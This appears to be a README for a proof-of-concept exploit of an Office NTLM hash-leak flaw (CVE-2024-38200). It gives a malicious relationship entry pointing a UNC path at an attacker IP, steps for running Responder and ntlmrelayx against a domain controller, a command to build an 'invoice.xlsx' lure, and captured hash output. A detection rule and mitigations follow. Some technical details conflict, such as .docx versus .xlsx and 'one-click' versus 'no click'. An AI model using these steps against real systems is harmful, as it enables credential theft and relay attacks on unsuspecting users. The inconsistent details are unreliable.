<div align="center">

# CVE-2024-38200

**Microsoft Office NTLM hash leak via UNC path in `.docx` relationships** — unauthenticated, one-click, remote.

[![CVE](https://img.shields.io/badge/CVE-2024--38200-red?style=flat-square)](https://nvd.nist.gov/vuln/detail/CVE-2024-38200)
[![CVSS](https://img.shields.io/badge/CVSS-6.5_Medium-orange?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)

</div>

Credits: [Lewis Lee](https://twitter.com/msftgeek) & [Jim Rush](https://twitter.com/nullbind) — original research at DEFCON 32 (August 2024).

Explanation: [The Hacker Recipes — NTLM Coercion](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications)

Advisory: [MSRC MSDT-2024-38200](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38200) · [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-38200)

---

## Vulnerability summary

| Field | Value |
|---|---|
| **Product** | Microsoft Office 2016, 2019, 2021, M365 Apps (x86/x64) |
| **Type** | NTLM hash leak (coerced authentication via UNC path) |
| **Authentication** | None required |
| **Interaction** | File open (one-click) |
| **CVSS v3.1** | 6.5 Medium — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |
| **Patch** | August 13, 2024 (KB5002611) |

---

## Root cause

Office processes `xl/worksheets/_rels/*.xml.rels` relationship files before rendering any UI. A `Target` attribute pointing to a UNC path (`\\attacker\share\file`) triggers an SMB connection — including NTLM authentication — with zero user indication. The file parser trusts `Target` values without scheme validation.

```xml
<!-- Malicious relationship entry in xl/worksheets/_rels/sheet1.xml.rels -->
<Relationship Id="rId1" Type=".../image"
  Target="\\192.168.1.100\share\logo.png"/>
```

Office connects to `\\192.168.1.100` during document load, sending the current user's Net-NTLMv2 hash.

---

## Attack chain

```
Attacker                           Victim
   |                                  |
   |-- sends malicious .xlsx -------->|
   |                                  |-- opens file
   |<-- SMB NEGOTIATE ----------------| (Office triggers UNC resolution)
   |<-- NTLM CHALLENGE + RESPONSE ----|
   |   (Net-NTLMv2 hash captured)     |
   |                                  |
   |-- hashcat --netntlmv2 hash.txt --> crack offline
   |-- ntlmrelayx.py --> relay to LDAP/SMB if signing disabled
```

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Phishing: Spearphishing Attachment | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) |
| Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) |
| Credential Access: NTLM Hash Theft | [T1187](https://attack.mitre.org/techniques/T1187/) |

---

## Usage

**Step 1 — Start a capture listener (Responder or ntlmrelayx):**

```bash
# Capture only
responder -I eth0 -wv

# Or relay to LDAP (disable SMB signing required on target)
ntlmrelayx.py -t ldap://dc01.corp.local --no-smb-server -smb2support
```

**Step 2 — Generate the malicious document:**

```bash
python3 cve_2024_38200.py --lhost 192.168.1.100 --output invoice.xlsx
```

**Step 3 — Send to target and wait:**

```
[+] Listening for connections...
[SMB] NTLMv2 Hash captured from 10.0.0.50:
CORP\jdupont::CORP:aabbccddeeff0011:A1B2C3D4...:0101000000000000...
```

---

## Proof of Concept

![PoC demo](.assets/poc.gif)

*The hash is captured as soon as the document is opened — no macro, no click, no warning.*

---

## Detection

**Sigma rule (document opening → outbound SMB):**

```yaml
title: Office Outbound SMB During Document Open
id: 4a9b7c2e-1234-5678-abcd-ef0123456789
status: experimental
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Image|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
    DestinationPort: 445
  condition: selection
falsepositives:
  - Legitimate documents referencing internal UNC paths
level: medium
```

**Mitigation:**
- Deploy KB5002611 (August 2024 patch)
- Block outbound SMB (TCP 445) at perimeter firewall
- Enable SMB signing (`Set-SmbServerConfiguration -RequireSecuritySignature $true`)
- Disable NTLM where possible (`Network security: Restrict NTLM`)

---

## License

MIT — see [LICENSE](LICENSE).

---

## Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
